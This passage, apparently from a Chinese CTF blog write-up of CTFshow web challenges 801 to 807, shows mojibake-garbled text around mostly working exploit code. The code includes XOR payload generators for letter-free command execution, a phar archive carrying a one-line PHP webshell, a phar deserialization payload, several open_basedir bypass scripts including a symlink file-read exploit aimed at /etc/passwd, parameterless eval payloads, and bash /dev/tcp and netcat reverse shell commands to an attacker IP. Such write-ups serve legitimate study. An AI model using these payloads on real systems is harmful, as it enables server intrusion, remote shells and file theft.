print(rv)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨æœ€ç»ˆç”Ÿæˆçš„PINè¿›å…¥ä»£ç è°ƒè¯•ï¼ŒRCE</p>
<p><strong>802</strong></p>

        <h3 id="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ-1"   >
          <a href="#æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ-1" class="headerlink" title="æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ"></a>æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</h3>
      <p>å¼‚æˆ–æ³•ï¼Œå·ä¸ªè„šæœ¬å–µå–µ</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php

&#x2F;*author yu22x*&#x2F;

$myfile &#x3D; fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);
$contents&#x3D;&quot;&quot;;
for ($i&#x3D;0; $i &lt; 256; $i++) &#123;
    for ($j&#x3D;0; $j &lt;256 ; $j++) &#123;

        if($i&lt;16)&#123;
            $hex_i&#x3D;&#39;0&#39;.dechex($i);
        &#125;
        else&#123;
            $hex_i&#x3D;dechex($i);
        &#125;
        if($j&lt;16)&#123;
            $hex_j&#x3D;&#39;0&#39;.dechex($j);
        &#125;
        else&#123;
            $hex_j&#x3D;dechex($j);
        &#125;
        $preg &#x3D; &#39;&#x2F;[a-z0-9]&#x2F;i&#39;; &#x2F;&#x2F;æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
            echo &quot;&quot;;
        &#125;

        else&#123;
            $a&#x3D;&#39;%&#39;.$hex_i;
            $b&#x3D;&#39;%&#39;.$hex_j;
            $c&#x3D;(urldecode($a)^urldecode($b));
            if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;
                $contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
            &#125;
        &#125;

    &#125;
&#125;
fwrite($myfile,$contents);
fclose($myfile);

# -*- coding: utf-8 -*-

# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1&#x3D;&quot;&quot;
   s2&#x3D;&quot;&quot;
   for i in arg:
       f&#x3D;open(&quot;xor_rce.txt&quot;,&quot;r&quot;)
       while True:
           t&#x3D;f.readline()
           if t&#x3D;&#x3D;&quot;&quot;:
               break
           if t[0]&#x3D;&#x3D;i:
               #print(i)
               s1+&#x3D;t[2:5]
               s2+&#x3D;t[6:9]
               break
       f.close()
   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;
   return(output)
   
while True:
   param&#x3D;action(input(&quot;\n[+] your functionï¼š&quot;) )+action(input(&quot;[+] your commandï¼š&quot;))+&quot;;&quot;
   print(param)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>803</strong></p>

        <h3 id="pharæ–‡ä»¶åŒ…å«-1"   >
          <a href="#pharæ–‡ä»¶åŒ…å«-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#pharæ–‡ä»¶åŒ…å«-1" class="headerlink" title="pharæ–‡ä»¶åŒ…å«"></a>pharæ–‡ä»¶åŒ…å«</h3>
      <p>æ¥è‡ªå¤§ä½¬çš„æç¤ºï¼šæŠŠpharå½“å‹ç¼©åŒ…ç”¨å°±è¡Œ</p>
<p>é¦–å…ˆç”ŸæˆåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„pharæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar
$phar-&gt;startBuffering();
$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;); &#x2F;&#x2F;è®¾ç½®stub
$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;&lt;?php system($_POST[a]);?&gt;&#39;); &#x2F;&#x2F;
$phar-&gt;stopBuffering();
&#x2F;&#x2F; pharç”Ÿæˆ
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤æ—¶pharåŒ…ä¸­çš„test.txtä¸­çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬äº†</p>
<p>ä¸Šä¼ æ–‡ä»¶ï¼ˆè®°å¾—è¯»å–ç„¶åurlç¼–ç ä¸€ä¸‹ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;tmp&#x2F;phar.phar&amp;content&#x3D;%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>includeå¹²</p>
<p><img   src="file:///Users/jlan/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-06-06%2020.00.48.png?lastModify=1654679483" style=""  alt="æˆªå±2022-06-06 20.00.48"></p>
<p><strong>804</strong></p>

        <h3 id="pharååºåˆ—åŒ–-1"   >
          <a href="#pharååºåˆ—åŒ–-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#pharååºåˆ—åŒ–-1" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3>
      <p>è¿™ä¸ç”¨æ•™å§</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
class hacker&#123;
    public $code;
&#125;

&#x2F;&#x2F; @unlink(&quot;phar.phar&quot;);
$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;åç¼€åå¿…é¡»ä¸ºphar
&#x2F;&#x2F; $phar &#x3D; $phar-&gt;convertToExecutable(Phar::TAR, Phar::GZ); &#x2F;&#x2F;å‹ç¼©è§„é¿æ•æ„Ÿå­—ç¬¦
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub
$o &#x3D; new hacker();
$o-&gt;code&#x3D;&quot;highlight_file(&#39;flag.php&#39;);&quot;;
$phar-&gt;setMetadata($o); &#x2F;&#x2F;å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
&#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—
$phar-&gt;stopBuffering();
&#x2F;&#x2F; pharç”Ÿæˆ

?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šä¼ pharåè®®è¯»å–å°±è¡Œ</p>
<p><strong>805</strong></p>

        <h3 id="open-basedirç»•è¿‡-1"   >
          <a href="#open-basedirç»•è¿‡-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#open-basedirç»•è¿‡-1" class="headerlink" title="open_basedirç»•è¿‡"></a>open_basedirç»•è¿‡</h3>
      <blockquote>
<p>open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚</p>
<p>å‡è®¾open_basedir=/var/www/html/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚</p>
<p>æ³¨æ„ï¼šç”¨open_basediræŒ‡å®šçš„<strong>é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å</strong>ã€‚</p>
<p>æ–‡ç« æ¥è‡ª<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/hookjoy/p/12846164.html" >è¿™é‡Œ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p>ä½†æ˜¯è¿™ä¸ªé…ç½®å¯¹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œæ¯”å¦‚æ‰§è¡Œ<code>system(&#39;ls /&#39;)</code>çš„æ—¶å€™å°±ä¸å—é™åˆ¶ï¼Œ<del>ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šè¢«banæ‰</del></p>
<p>ä¸‹é¢å°±æ˜¯ä¸€äº›bypassæ–¹æ³•</p>
<ol>
<li><p>globåè®®ï¼Œåªèƒ½æææ–‡ä»¶å</p>
<pre class="line-numbers language-none"><code class="language-none">$a &#x3D; &quot;glob:&#x2F;&#x2F;&#x2F;*&quot;;
if ( $b &#x3D; opendir($a) ) &#123;
  while ( ($file &#x3D; readdir($b)) !&#x3D;&#x3D; false ) &#123;
    echo $file.&quot;\n&quot;;
  &#125;
  closedir($b);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass</p>
<p>åŸç†åœ¨è¿™é‡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">mkdir(&quot;s&quot;);
chdir(&#39;s&#39;);
ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
chdir(&#39;..&#39;);
ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);
echo file_get_contents(&quot;&#x2F;ctfshowflag&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>åˆ©ç”¨bindtextdomain()å‡½æ•°Bypass</p>
<p>è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½æææ–‡ä»¶å</p>
<blockquote>
<p><strong>bindtextdomain()å‡½æ•°</strong></p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>bindtextdomain()å‡½æ•°ç”¨äºç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">bindtextdomain ( string $domain , string $directory ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>bindtextdomain()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°$directoryæ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå®ƒä¼šåœ¨$directoryå­˜åœ¨çš„æ—¶å€™è¿”å›$directoryï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚</p>
</blockquote>
<p>æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹directoryå‚æ•°æ ¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p>
</li>
<li><p>åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•Bypass</p>
<p>è¿™ä¸ªå’Œä¸Šé¢é‚£ä¸ªå¾ˆç›¸ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºæŠ¥é”™ï¼Œç›´æ¥ç»™payloadå§</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
echo &#39;&lt;b&gt;open_basedir: &#39; . ini_get(&#39;open_basedir&#39;) . &#39;&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;;
$info &#x3D; new SplFileInfo($_GET[&#39;dir&#39;]);
var_dump($info-&gt;getRealPath());
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>åˆ©ç”¨realpath()å‡½æ•°Bypass</p>
<blockquote>

        <h3 id="realpath-å‡½æ•°-1"   >
          <a href="#realpath-å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#realpath-å‡½æ•°-1" class="headerlink" title="realpath()å‡½æ•°"></a>realpath()å‡½æ•°</h3>
      <p>(PHP 4, PHP 5, PHP 7)</p>
<p>realpath â€” è¿”å›è§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„åã€‚å®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚</p>
<p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">realpath ( string $path ) : string<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


        <h3 id="Bypass-1"   >
          <a href="#Bypass-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3>
      <p>ç¯å¢ƒæ¡ä»¶ï¼šWindows</p>
<p>åŸºæœ¬åŸç†æ˜¯åŸºäºæŠ¥é”™è¿”å›å†…å®¹çš„ä¸ç”¨ï¼Œè®¾ç½®è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¾ªç¯éå†åŒ¹é…åˆ°æ­£åˆ™çš„æŠ¥é”™ä¿¡æ¯çš„å­—ç¬¦æ¥é€ä¸ªæ‹¼æ¥æˆå­˜åœ¨çš„æ–‡ä»¶åï¼Œå¦å¤–æ˜¯éœ€è¦ç»“åˆåˆ©ç”¨Windowsä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„é€šé…ç¬¦&lt;å’Œ&gt;ï¼Œä¸ç„¶åªèƒ½è¿›è¡Œæš´ç ´ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
printf(&quot;&lt;b&gt;open_basedir: %s&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&quot;, ini_get(&#39;open_basedir&#39;));
set_error_handler(&#39;isexists&#39;);
$dir &#x3D; &#39;E:&#x2F;wamp64&#x2F;&#39;;
$file &#x3D; &#39;&#39;;
$chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;
for ($i&#x3D;0; $i &lt; strlen($chars); $i++) &#123;
        $file &#x3D; $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;
        realpath($file);
&#125;
function isexists($errno, $errstr)
&#123;
        $regexp &#x3D; &#39;&#x2F;File\((.*)\) is not within&#x2F;&#39;;
        preg_match($regexp, $errstr, $matches);
        if (isset($matches[1])) &#123;
                printf(&quot;%s &lt;br&#x2F;&gt;&quot;, $matches[1]);
        &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹åˆ°ï¼Œé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶å°±è¢«åˆ—å‡ºæ¥äº†ï¼Œé¦–å­—æ¯ç›¸åŒçš„æ–‡ä»¶ä¸­åªåˆ—äº†ç¬¬ä¸€ä¸ªï¼š</p>
<p><img src="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png" alt="img"></p>
</li>
</ol>
<p>æœ€åæ˜¯å¤§ä½¬è„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
&#x2F;*
* by phithon
* From https:&#x2F;&#x2F;www.leavesongs.com
* detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068
*&#x2F;
header(&#39;content-type: text&#x2F;plain&#39;);
error_reporting(-1);
ini_set(&#39;display_errors&#39;, TRUE);
printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());
printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));
$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);
$relat_file &#x3D; getRelativePath(__FILE__, $file);
$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);
$name &#x3D; mt_rand() % 999;
$exp &#x3D; getRandStr();
mkdir($name);
chdir($name);
for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;
    mkdir($paths[$i]);
    chdir($paths[$i]);
&#125;
mkdir($paths[$i]);
for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123; 
    chdir(&#39;..&#39;);
&#125;
$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);
$j &#x3D; 0;
for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123; 
    mkdir($name);
    chdir($name);
    $j++;
&#125;
for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123; 
    chdir(&#39;..&#39;);
&#125;
$tmp &#x3D; array_fill(0, $j + 1, $name);
symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);
$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);
symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);
unlink(&#39;tmplink&#39;);
mkdir(&#39;tmplink&#39;);
delfile($name);
$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;
$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;
echo &quot;\n-----------------content---------------\n\n&quot;;
echo file_get_contents($exp);
delfile(&#39;tmplink&#39;);

function getRelativePath($from, $to) &#123;
  &#x2F;&#x2F; some compatibility fixes for Windows paths
  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;
  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);
  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);

  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);
  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);
  $relPath  &#x3D; $to;

  foreach($from as $depth &#x3D;&gt; $dir) &#123;
    &#x2F;&#x2F; find first non-matching dir
    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;
      &#x2F;&#x2F; ignore this directory
      array_shift($relPath);
    &#125; else &#123;
      &#x2F;&#x2F; get number of remaining dirs to $from
      $remaining &#x3D; count($from) - $depth;
      if($remaining &gt; 1) &#123;
        &#x2F;&#x2F; add traversals up to first matching dir
        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;
        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);
        break;
      &#125; else &#123;
        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];
      &#125;
    &#125;
  &#125;
  return implode(&#39;&#x2F;&#39;, $relPath);
&#125;

function delfile($deldir)&#123;
    if (@is_file($deldir)) &#123;
        @chmod($deldir,0777);
        return @unlink($deldir);
    &#125;else if(@is_dir($deldir))&#123;
        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;
        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))
        &#123;
            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);
            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;
        &#125; 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    &#125;
&#125;

function File_Str($string)
&#123;
    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));
&#125;

function getRandStr($length &#x3D; 6) &#123;
    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;
    $randStr &#x3D; &#39;&#39;;
    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;
        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    &#125;
    return $randStr;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>includeè¿œç¨‹æ–‡ä»¶åä¼ å‚fileå³å¯</p>
<p><strong>806</strong></p>

        <h3 id="phpæ— å‚RCE-1"   >
          <a href="#phpæ— å‚RCE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#phpæ— å‚RCE-1" class="headerlink" title="phpæ— å‚RCE"></a>phpæ— å‚RCE</h3>
      <p>é¦–å…ˆæ˜¯ä¸€ç¯‡å¯ä¾›å‚è€ƒçš„<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261" >æ–‡ç« </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>åˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§</p>
<ol>
<li><p><strong>åˆ©ç”¨session_id</strong></p>
<p>phpä¸­æœ‰ä¸€ä¸ªå‡½æ•°å«session_id(),å¯ä»¥ç›´æ¥è·å–åˆ°cookieä¸­çš„phpsessionidå€¼ï¼Œphpsessionidçš„ç»„æˆç¬¦å·æœ‰é™å®š,ä¸èƒ½ä½¿ç”¨ â€™ () â€˜ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç„¶åå†é€šè¿‡hex2binå‡½æ•°è½¬æ¢å›å»ï¼Œ<code>bin2hex(&#39;payload&#39;);</code>æ¥è½¬æ¢16ç¦æ­¢ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡<code>eval(hex2bin(session_id(session_start())));</code>ï¼Œåœ¨åŠ ä¸Šè¯·æ±‚å¤´ä¸­Cookieä¸­çš„<code>PHPSESSID=16è¿›åˆ¶payload</code>æ‰§è¡Œ</p>
</li>
<li><p><strong>åˆ©ç”¨<code>get_defined_vars ()</code>å‡½æ•°</strong></p>
<p><code>get_defined_vars()</code>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</p>
<p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p>
<pre class="line-numbers language-none"><code class="language-none">end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚
each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥çœ‹åˆ°åœ¨å·²å®šä¹‰çš„å˜é‡ä¸­å­˜åœ¨ç€å…¨å±€å˜é‡GETå’ŒPOSTï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°æ¥å®ç°RCE</p>
<pre class="line-numbers language-none"><code class="language-none">payload:?a&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>æ–‡ä»¶è¯»å–</p>
<p>å¯ä¾›åˆ©ç”¨çš„å‡½æ•°</p>
<pre class="line-numbers language-none"><code class="language-none">var_dump()  æ‰“å°æ‰€æœ‰å†…å®¹
print_r()  åŒä¸Š
scandir()  æ‰«æè·¯å¾„å†…æ–‡ä»¶åå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨
localeconv()  
getcwd()  è·å¾—å½“å‰å·¥ä½œç›®å½•
getallheaders()  è·å¾—è¯·æ±‚å¤´å†…å®¹
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<p><strong>807</strong></p>

        <h3 id="åå¼¹shell-1"   >
          <a href="#åå¼¹shell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå¼¹shell-1" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3>
      <p>æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œè®°ä½è¦æœ‰å…¬ç½‘IPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨frpå†…ç½‘ç©¿é€</p>
<ol>
<li><p>å…¬ç½‘æœåŠ¡å™¨</p>
<p>ç›‘å¬å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">æ”»å‡»ç«¯
nc -lvp ç›‘å¬çš„ç«¯å£
å—å®³ç«¯
bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æ”»å‡»ç«¯IP&#x2F;æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0&gt;&amp;1
nc æ”»å‡»ç«¯IP æ”»å‡»ç«¯ç›‘å¬ç«¯å£ -t &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ©ç”¨wgetä¸‹è½½æ‰§è¡Œ</p>
